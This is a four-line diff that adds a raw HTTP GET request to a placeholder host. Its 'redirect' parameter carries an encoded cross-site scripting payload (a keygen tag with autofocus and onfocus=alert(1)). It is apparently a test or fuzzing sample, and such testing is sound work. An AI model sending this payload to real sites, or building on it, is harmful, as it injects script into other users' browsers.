@@ -1,0 +1,4 @@
+GET /a?redirect=\u003Ckeygen%20autofocus%20onfocus%3Dalert(1)\u003E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
